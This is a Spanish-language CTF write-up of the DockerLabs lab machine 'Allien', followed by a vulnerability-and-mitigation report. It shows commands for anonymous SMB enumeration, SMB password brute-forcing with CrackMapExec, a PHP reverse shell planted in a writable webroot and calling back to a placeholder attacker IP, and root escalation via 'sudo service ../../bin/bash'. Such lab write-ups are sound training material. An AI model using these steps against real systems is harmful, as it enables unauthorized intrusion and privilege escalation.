# Allien

> Enumeración SMB anónima que filtra usuarios y un JWT, fuerza bruta de satriani7 por SMB, un fichero con la contraseña del administrador, acceso por SSH, una reverse shell PHP en el webroot para pasar a www-data y escalada a root abusando de un sudo NOPASSWD sobre service.

| | |
|---|---|
| **Plataforma** | DockerLabs |
| **Dificultad** | Fácil |
| **Objetivo** | `172.17.0.2` |
| **Servicios** | 22/tcp (SSH), 80/tcp (HTTP), 139·445/tcp (SMB) |
| **Saltos de usuario** | 3 |

**Tags:** `SMB` · `enum4linux` · `smbclient` · `CrackMapExec` · `JWT` · `Reverse shell` · `sudo` · `GTFOBins`

---

## Reconocimiento

```bash
$ sudo nmap -p- -sS -sCV --open -n -Pn 172.17.0.2
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu
80/tcp  open  http        Apache httpd 2.4.58 ((Ubuntu))
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
```

Lo que destaca es Samba (139/445). Antes de tocar la web, enumero el SMB, que suele ser una mina de información.

## Enumeración SMB

```bash
$ enum4linux 172.17.0.2
[+] Server 172.17.0.2 allows sessions using username '', password ''
... Users ...
Account: usuario1 / usuario2 / usuario3 / administrador / satriani7
... Shares ...
myshare    Disk   Carpeta compartida sin restricciones
backup24   Disk   Privado
home       Disk   Produccion
```

El servidor permite sesión nula (sin credenciales) y lista usuarios y recursos. El recurso `myshare` es accesible de forma anónima.

```bash
$ smbclient //172.17.0.2/myshare -N
smb: \> ls
  access.txt                          N      956
smb: \> get access.txt
```

## El JWT de access.txt

El contenido de `access.txt` es un JWT (tres bloques en Base64 separados por puntos). Decodifico la parte del payload para ver qué guarda.

```bash
$ cat access.txt | cut -d. -f2 | base64 -d 2>/dev/null
{"email":"satriani7@eseemeb.dl","role":"user","iat":1728160373, ...}
```

El token revela un correo y, sobre todo, un usuario: **satriani7**.

## Fuerza bruta de satriani7

Con el usuario identificado, lanzo fuerza bruta contra el SMB con CrackMapExec.

```bash
$ crackmapexec smb 172.17.0.2 -u satriani7 -p rockyou.txt
SMB   172.17.0.2   445   SAMBASERVER   [+] SAMBASERVER\satriani7:50cent
```

Credenciales: **satriani7 : 50cent**.

## El recurso backup24

Con esas credenciales accedo al recurso privado `backup24` y busco lo interesante.

```bash
$ smbclient //172.17.0.2/backup24 -U satriani7
Password: (50cent)
smb: \> cd Documents\Personal\
smb: \> get credentials.txt
```

El fichero `credentials.txt` es un listado de credenciales en texto plano. La que me interesa:

```bash
7. Usuario: administrador
   - Contraseña: Adm1nP4ss2024
```

## Acceso por SSH

```bash
$ ssh administrador@172.17.0.2
administrador@172.17.0.2's password: (Adm1nP4ss2024)
Welcome to Ubuntu 24.04.1 LTS
$ whoami
administrador
$ script /dev/null -c bash
```

## Pivote a www-data

administrador tiene permisos de escritura en el webroot `/var/www/html`. Eso me permite dejar una reverse shell en PHP que ejecutará el servidor web (como www-data).

```bash
$ ls -la /var/www/html/
drwxrwxrwx 2 root root 4096 ... .   <-- escribible por cualquiera
```

Creo `shell.php` apuntando a mi máquina (`<IP_ATACANTE>`) en el puerto 4444, me pongo a la escucha y lo disparo por HTTP.

```bash
$ nc -lvnp 4444
listening on [any] 4444 ...

$ curl http://172.17.0.2/shell.php

connect to [<IP_ATACANTE>] from (UNKNOWN) [172.17.0.2]
$ whoami
www-data
```

## Escalada a root · sudo service

Estabilizo la TTY y reviso los permisos de sudo de www-data.

```bash
$ sudo -l
User www-data may run the following commands on a75e760e805b:
    (ALL) NOPASSWD: /usr/sbin/service
```

www-data puede ejecutar `service` como root sin contraseña. Según GTFOBins, service acepta una ruta a un script; pasándole una ruta relativa a bash consigo una shell privilegiada.

```bash
$ sudo service ../../bin/bash
root@a75e760e805b:/# whoami
root
```

Máquina Allien completada: `uid=0(root)`.

---

## Informe · vulnerabilidades y mitigaciones

### 🔴 CRÍTICA — Escalada a root por sudo NOPASSWD sobre /usr/sbin/service

`CWE-250` · A05:2021 – Security Misconfiguration

**Impacto.** www-data puede ejecutar service como root sin contraseña; con una ruta relativa se lanza una bash privilegiada (GTFOBins).

**Mitigación.** Eliminar o restringir la regla sudo; nunca conceder NOPASSWD sobre binarios que invocan otros programas.

### 🟠 ALTA — Credenciales en texto plano en un recurso de red

`CWE-312` · A02:2021 – Cryptographic Failures

**Impacto.** El recurso backup24 contiene un credentials.txt con todas las contraseñas en claro, incluida la del administrador (Adm1nP4ss2024).

**Mitigación.** No almacenar credenciales en texto plano ni en recursos compartidos; usar un gestor de secretos y cifrado en reposo.

### 🟠 ALTA — Contraseña débil susceptible a fuerza bruta

`CWE-521` · A07:2021 – Identification and Authentication Failures

**Impacto.** La cuenta satriani7 usa una contraseña débil (50cent), descubierta por fuerza bruta contra el SMB.

**Mitigación.** Contraseñas robustas, bloqueo de cuenta tras N intentos y monitorización de accesos.

### 🟠 ALTA — Directorio web escribible por un usuario sin privilegios

`CWE-732` · A05:2021 – Security Misconfiguration

**Impacto.** El webroot /var/www/html es escribible, lo que permite subir una web shell PHP y ejecutar comandos como www-data.

**Mitigación.** Permisos correctos en el webroot (no escribible por usuarios) y deshabilitar la ejecución de scripts subidos.

### 🟡 MEDIA — SMB con sesión nula y recurso compartido anónimo

`CWE-306` · A05:2021 – Security Misconfiguration

**Impacto.** Samba permite enumerar usuarios sin credenciales (enum4linux) y acceder de forma anónima al recurso myshare, que filtra un JWT con un usuario válido.

**Mitigación.** Deshabilitar las sesiones nulas (restrict anonymous), no exponer recursos sin autenticación y limitar la enumeración.

---

_Writeup de **Allien** · DockerLabs · por [ak1t4](https://github.com/ak1ta4)_
